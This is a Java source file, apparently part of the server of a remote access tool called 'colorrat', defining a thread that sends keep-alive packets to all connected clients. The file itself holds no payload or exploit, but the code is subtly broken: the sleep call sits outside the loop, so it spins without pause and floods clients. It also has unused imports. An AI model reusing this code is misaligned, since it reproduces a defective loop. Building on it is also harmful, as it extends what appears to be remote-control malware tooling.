package eu.aragonapp.colorrat.network.thread.types;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.packet.types.server.S01PacketKeepAlive;
import eu.aragonapp.colorrat.network.thread.ColorThread;
import eu.aragonapp.colorrat.utils.$;
import eu.aragonapp.colorrat.utils.Logger;
import org.jline.reader.EndOfFileException;
import org.jline.reader.LineReader;
import org.jline.reader.LineReaderBuilder;
import org.jline.reader.MaskingCallback;
import org.jline.terminal.Terminal;
import org.jline.terminal.TerminalBuilder;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class KeepAliveThread extends ColorThread {

    public KeepAliveThread() {
        super("KeepAlive");
    }

    @Override
    public void run() {
        while (ColorServer.getInstance().isRunning()) {
            for (NetworkConnection networkConnection : ColorServer.getInstance().getClients())
                networkConnection.write(new S01PacketKeepAlive());
        }

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

}
